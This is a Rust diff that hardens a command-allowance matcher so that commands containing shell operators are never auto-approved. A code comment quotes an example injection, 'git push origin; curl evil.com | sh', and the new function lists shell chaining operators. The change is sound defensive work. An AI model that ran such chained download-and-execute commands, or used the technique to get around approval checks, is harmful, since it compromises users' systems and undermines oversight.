@@ -214,11 +214,39 @@ impl AllowancePattern {
                 SensitiveAction::ExecuteCommand { command, .. },
             ) => workspace_root.is_some() && matches_file_glob(pattern, command),
 
-            // CommandPattern matches ExecuteCommand (no workspace check)
+            // CommandPattern matches ExecuteCommand by full command string
+            // (command + args joined). This allows "git push *" to match
+            // ExecuteCommand { command: "git push origin main", args: [] }
+            // as well as { command: "git", args: ["push", "origin", "main"] }.
+            //
+            // SECURITY: Commands containing shell operators (;, &&, ||, |, $,
+            // backticks, newlines) are never auto-approved via allowance. This
+            // prevents a malicious capsule from chaining "git push origin; curl
+            // evil.com | sh" through a "git push *" session allowance.
             (
                 Self::CommandPattern { command: pattern },
-                SensitiveAction::ExecuteCommand { command, .. },
-            ) => matches_file_glob(pattern, command),
+                SensitiveAction::ExecuteCommand { command, args },
+            ) => {
+                let full_cmd = if args.is_empty() {
+                    command.clone()
+                } else {
+                    format!("{command} {}", args.join(" "))
+                };
+
+                // Reject commands with shell operators - force explicit approval.
+                if contains_shell_operators(&full_cmd) {
+                    return false;
+                }
+
+                let mut is_match = matches_file_glob(pattern, &full_cmd);
+                // Allow "cmd *" to also match "cmd" (no args). The glob "cmd *"
+                // requires at least one char after the space, so "cmd" alone
+                // wouldn't match without this fallback.
+                if !is_match && let Some(prefix) = pattern.strip_suffix(" *") {
+                    is_match = full_cmd == prefix;
+                }
+                is_match
+            },
 
             // CapsuleCapability: match plugin actions with same capsule_id + derived capability
             (
@@ -300,6 +328,24 @@ fn path_in_workspace(path: &str, workspace_root: Option<&Path>) -> bool {
             path.starts_with(root)
         },
     }
+}
+
+/// Returns `true` if the command string contains shell operators that could
+/// chain additional commands. Commands with these operators must always
+/// require explicit user approval and cannot be auto-approved via session
+/// allowances.
+fn contains_shell_operators(cmd: &str) -> bool {
+    // Check for common shell chaining/injection operators.
+    // Covers: ; && || | $( ` \n > < (redirects can overwrite files)
+    cmd.contains(';')
+        || cmd.contains("&&")
+        || cmd.contains("||")
+        || cmd.contains('|')
+        || cmd.contains("$(")
+        || cmd.contains('`')
+        || cmd.contains('\n')
+        || cmd.contains('>')
+        || cmd.contains('<')
 }
 
 /// Check if a file path matches a glob pattern, with path traversal protection.
